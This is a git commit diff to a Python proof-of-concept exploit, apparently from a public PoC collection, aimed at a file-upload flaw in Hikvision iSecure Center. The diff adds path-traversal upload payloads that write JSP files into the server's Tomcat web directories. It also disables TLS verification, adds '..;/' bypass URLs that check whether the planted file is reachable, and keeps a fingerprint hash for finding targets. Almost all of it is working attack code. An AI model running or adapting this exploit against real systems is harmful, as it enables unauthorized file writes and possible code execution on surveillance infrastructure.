c0c139045b730e9a37f657f99a34e0c07af73c30
MD-SEC <MD_SEC@163.com>
2023-11-17 13:56:21 +0800

    多种打法

--- Hikvison_iSecure_Center_Report_Upload_File_Poc.py
+++ Hikvison_iSecure_Center_Report_Upload_File_Poc.py
@@ -3,6 +3,7 @@
 # author:MDSEC
 # from:https://github.com/MD-SEC/MDPOCS
 # icon_hash="-911494769"
+# icon_hash="-1605849932"
 
 import sys
 import requests
@@ -10,7 +11,7 @@ import csv
 import urllib3
 import hashlib
 from concurrent.futures import ThreadPoolExecutor
-
+urllib3.disable_warnings()
 if len(sys.argv) != 2:
     print(
         '+----------------------------------------------------------------------------------------------------------+')
@@ -28,11 +29,13 @@ if len(sys.argv) != 2:
 proxysdata = {
 'http': '127.0.0.1:8081'
 }  
+#../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp
+#../../../tomcat85linux64.1/webapps/els/static/test.jsp
 def exp(host):
     if "http" in host:
         url = host
     else:
-        url ="http://"+host
+        url ="https://"+host
     host1=url.replace("http://","")
     host2=host1.replace("https://","")
     headers = {
@@ -45,20 +48,24 @@ def exp(host):
         "Accept": "*/*",
         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
         "Accept-Encoding": "gzip, deflate,br",
-        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundary9PggsiM755PLa54a",
         "Host": "%s" %host2
     }
-    data ='------WebKitFormBoundary9PggsiM755PLa54a\r\nContent-Disposition: form-data; name="file"; filename="../../tomcat85linux64.1/webapps/els/static/MDTEST.jsp"\r\nContent-Type:application/zip\r\n\r\n<%out.print("MDSEC");%>\r\n\r\n------WebKitFormBoundary9PggsiM755PLa54a--'
+    data ='------WebKitFormBoundary9PggsiM755PLa54a\r\nContent-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/test.jsp"\r\nContent-Type:application/zip\r\n\r\n<%out.print("test");%>\r\n\r\n------WebKitFormBoundary9PggsiM755PLa54a--'
+    data2='------WebKitFormBoundary9PggsiM755PLa54a\r\nContent-Disposition: form-data; name="file"; filename="../../../tomcat85linux64.1/webapps/els/static/test.jsp"\r\nContent-Type:application/zip\r\n\r\n<%out.print("test");%>\r\n\r\n------WebKitFormBoundary9PggsiM755PLa54a--'
     vulurl = url + "/svm/api/external/report"
-    vulurl2= url+"/portal/ui/login/..;/..;/MDTEST.jsp"
+    vulurl2= url+"/portal/ui/login/..;/..;/test.jsp"
+    vulurl3= url+"/els/static/test.jsp"
     try:
-        
-        r = requests.post(vulurl, headers=headers,data=data)
-        if r.status_code==200 and "data" in r.text :
-            print(url+r.text+"上传路径为/portal/ui/login/..;/..;/XXX")
-            r2=requests.get(vulurl2,headers=headers2)
-            if r2.status_code==200 and "MDSEC" in r2.text:
-                print(url+" :true")
+        r = requests.post(vulurl, headers=headers,data=data,verify=False)
+        r4 = requests.post(vulurl, headers=headers,data=data2,verify=False)
+        if  "code" in r.text or "code" in r4.text :
+            print(url+"存在上传接口")
+            r2=requests.get(vulurl2,headers=headers2,verify=False)
+            if r2.status_code==200 and "test" in r2.text:
+                print(url+"/portal/ui/login/..;/..;/test.jsp")
+            r3=requests.get(vulurl3,headers=headers2,verify=False)
+            if r3.status_code==200 and "test" in r3.text:
+                print(url+"/els/static/test.jsp")
             #print("http://"+host+":true 文件地址为："+"")
         else:
             return 0
